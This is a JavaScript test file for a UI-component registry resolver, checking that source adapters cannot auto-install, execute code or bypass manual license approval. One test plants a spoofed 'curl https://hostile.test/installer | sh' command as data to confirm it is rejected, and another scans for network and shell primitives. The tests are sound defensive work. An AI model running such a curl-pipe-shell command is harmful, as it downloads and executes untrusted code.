import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { readWowRegistry } from "../ui-registry/wow-contract.mjs";
import { readWowAdapters, validateWowAdapters, resolveWowAdapters } from "../ui-registry/wow-resolver.mjs";

const inventory = readWowRegistry();
const adapters = readWowAdapters();
const policy = JSON.parse(fs.readFileSync("ui-registry/wow-review-policy.json","utf8"));
const clone = structuredClone;
const consumer = (framework="react-vite",styling="css",allow=inventory.sources.map(x=>x.id)) => ({
  version:1,enabled:true,profile:"marketing-wow",
  stack:{framework,styling,typescript:true},sources:{mode:"reference-only",allow},
  motion:{mode:"intentional",reducedMotion:"required"}
});
const resolve = (options={}) => resolveWowAdapters({
  consumer:consumer(),inventory,policy,adapters,...options
});
const approved = (id, mode="copy-adapt") => {
  const s=inventory.sources.find(x=>x.id===id), SHA="f".repeat(40);
  return {version:1,defaultDisposition:"reference-only",blocked:[],
    approvals:[{sourceId:id,repository:s.repository,commit:SHA,spdx:"MIT",
      licenseEvidenceUrl:s.repository+"/blob/"+SHA+"/LICENSE",reviewer:"TrigenysReviewer",
      reviewedOn:"2026-10-10",allowedModes:[mode],noticeFile:"THIRD_PARTY_NOTICES.md"}]};
};

test("all nine sources have matching safe adapters and no installation commands",()=>{
  assert.equal(adapters.adapters.length,inventory.sources.length);
  assert.deepEqual(validateWowAdapters(adapters,inventory),[]);
  const schema=JSON.parse(fs.readFileSync("ui-registry/schemas/wow-adapters.schema.json","utf8"));
  assert.equal(schema.additionalProperties,false);
  assert.equal(schema.properties.version.const,1);
  for(const adapter of adapters.adapters) {
    assert.equal(adapter.autoInstall,false);
    assert.equal(adapter.executable,false);
    assert.ok(!("installCommand" in adapter));
  }
});

test("metadata source and adapters never let an unknown or spoofed entry gain code execution",()=>{
  const dup=clone(adapters);
  dup.adapters.push(clone(dup.adapters[0]));
  assert.match(validateWowAdapters(dup,inventory).join(" "),/duplicate adapter/);
  const missing=clone(adapters);
  missing.adapters.pop();
  assert.match(validateWowAdapters(missing,inventory).join(" "),/missing adapter/);
  const unknown=clone(adapters);
  unknown.adapters[0].sourceId="unlisted-registry";
  assert.match(validateWowAdapters(unknown,inventory).join(" "),/unknown source/);
  const kind=clone(adapters);
  kind.adapters.find(a=>a.sourceId==="tailark").interfaceKind="external-tool";
  assert.match(validateWowAdapters(kind,inventory).join(" "),/interface does not match/);
  const remote=clone(adapters);
  remote.adapters[0].installCommand="curl https://hostile.test/installer | sh";
  remote.adapters[0].executable=true;
  const errs=validateWowAdapters(remote,inventory).join(" ");
  assert.match(errs,/unexpected field installCommand/);
  assert.match(errs,/execution and automatic installation are forbidden/);
});

test("current source inventory resolves across all nine sources but never grants reuse",()=>{
  const result=resolve();
  assert.equal(result.ok,true);
  assert.equal(result.status,"PLAN_ONLY");
  assert.equal(result.operationsAllowed,false);
  assert.equal(result.sources.length,9);
  assert.ok(result.sources.every(x=>x.decision==="reference-only"));
  assert.ok(result.sources.every(x=>x.actions.installAutomatically===false));
  assert.ok(result.sources.every(x=>x.actions.copyAutomatically===false));
  assert.ok(result.sources.every(x=>x.actions.executeRemote===false));
  assert.deepEqual(result.sources.map(x=>x.sourceId),consumer().sources.allow);
});

test("React/Vite+plain CSS requests Tailwind adaptation but cannot install Tailwind",()=>{
  const result=resolve({consumer:consumer("react-vite","css",["magic-ui","tailark","web-interface-guidelines"])});
  assert.equal(result.ok,true);
  const [magic,tailark,guide]=result.sources;
  assert.equal(magic.technicalFit,"adapt");
  assert.equal(tailark.technicalFit,"adapt");
  assert.equal(guide.technicalFit,"reference-only");
  assert.ok(tailark.reasons.some(x=>x.includes("no Tailwind installation")));
  assert.deepEqual(tailark.approvedModes,[]);
  assert.equal(tailark.decision,"reference-only");
});

test("React/Next+Tailwind is natively compatible but default policy stays research only",()=>{
  const report=resolve({consumer:consumer("react-next","tailwind",["tailark","magic-ui"])});
  assert.equal(report.ok,true);
  assert.equal(report.sources[0].technicalFit,"native");
  assert.equal(report.sources[1].technicalFit,"native");
  assert.equal(report.sources[0].decision,"reference-only");
  assert.ok(report.sources.every(x=>x.approvedModes.length===0));
});

test("hypothetical reviewed Tailark registry approval is manual and stack-specific",()=>{
  const p=approved("tailark","registry-install");
  const next=resolve({consumer:consumer("react-next","tailwind",["tailark"]),policy:p});
  assert.equal(next.ok,true);
  assert.equal(next.sources[0].decision,"native");
  assert.deepEqual(next.sources[0].approvedModes,["registry-install"]);
  assert.equal(next.sources[0].actions.installAutomatically,false);
  const css=resolve({consumer:consumer("react-vite","css",["tailark"]),policy:p});
  assert.equal(css.sources[0].decision,"adapt");
  assert.deepEqual(css.sources[0].approvedModes,[]);
  assert.equal(css.sources[0].actions.installAutomatically,false);
  const vue=resolve({consumer:consumer("vue-vite","css",["tailark"]),policy:p});
  assert.equal(vue.sources[0].decision,"reference-only");
  assert.deepEqual(vue.sources[0].approvedModes,[]);
});

test("non-React consumers are reference-only even under synthetic central approval",()=>{
  const report=resolve({
    consumer:consumer("svelte-kit","css",["magic-ui","react-bits","web-interface-guidelines"]),
    policy:approved("magic-ui")
  });
  assert.equal(report.ok,true);
  assert.ok(report.sources.every(x=>x.decision==="reference-only"));
  assert.ok(report.sources.every(x=>x.actions.executeRemote===false));
});

test("MCP and guidance adapters are optional, non-executable and cannot be secretly promoted",()=>{
  const disconnected=resolve({consumer:consumer("react-vite","tailwind",["21st-magic-mcp","web-interface-guidelines"])});
  assert.equal(disconnected.sources[0].interfaceKind,"external-tool");
  assert.equal(disconnected.sources[0].optionalService,true);
  assert.equal(disconnected.sources[0].externalServiceConnected,false);
  assert.equal(disconnected.sources[0].decision,"reference-only");
  assert.equal(disconnected.sources[1].interfaceKind,"guidance");
  const connected=resolve({
    consumer:consumer("react-vite","tailwind",["21st-magic-mcp"]),
    connectedExternalTools:["21st-magic-mcp"]
  });
  assert.equal(connected.sources[0].externalServiceConnected,true);
  assert.equal(connected.sources[0].decision,"reference-only");
  assert.equal(connected.sources[0].actions.executeRemote,false);
  const bad=resolve({connectedExternalTools:["any-unreviewed-mcp"]});
  assert.equal(bad.ok,false);
  assert.match(bad.errors.join(" "),/connectedExternalTools/);
});

test("existing runtime is reused; missing hints require review instead of dependency installation",()=>{
  const report=resolve({
    consumer:consumer("react-vite","css",["magic-ui","beui","motion-primitives-website"]),
    installedMotionRuntimes:["motion"]
  });
  assert.equal(report.ok,true);
  assert.deepEqual(report.sources[0].runtime.reuseExisting,["motion"]);
  assert.deepEqual(report.sources[1].runtime.reuseExisting,["motion"]);
  assert.ok(report.sources[2].runtime.needsDependencyReview.includes("gsap"));
  assert.ok(report.sources[2].runtime.needsDependencyReview.includes("three"));
  assert.ok(report.sources.every(x=>x.runtime.installAutomatically===false));
  assert.equal(resolve({installedMotionRuntimes:["motion","motion"]}).ok,false);
  assert.equal(resolve({installedMotionRuntimes:["sneaky-shell"]}).ok,false);
});

test("blocked sources and malformed policy fail closed",()=>{
  const p=clone(policy);p.blocked=["magic-ui"];
  const r=resolve({consumer:consumer("react-next","tailwind",["magic-ui"]),policy:p});
  assert.equal(r.sources[0].decision,"unsupported");
  const invalid=clone(policy);invalid.defaultDisposition="approve-everything";
  const rejected=resolve({policy:invalid});
  assert.equal(rejected.ok,false);
  assert.equal(rejected.sources.length,0);
  assert.equal(rejected.operationsAllowed,false);
});

test("disabled consumers cause no resolution and no operations",()=>{
  const output=resolve({consumer:{version:1,enabled:false}});
  assert.equal(output.ok,true);
  assert.equal(output.status,"DISABLED");
  assert.deepEqual(output.sources,[]);
  assert.equal(output.operationsAllowed,false);
});

test("resolver has no network calls or child process/install shell primitives",()=>{
  const text=fs.readFileSync("ui-registry/wow-resolver.mjs","utf8");
  assert.doesNotMatch(text,/\b(?:fetch\s*\(|axios|child_process|execSync|spawnSync|writeFileSync|npm install|npx|curl)\b/i);
});
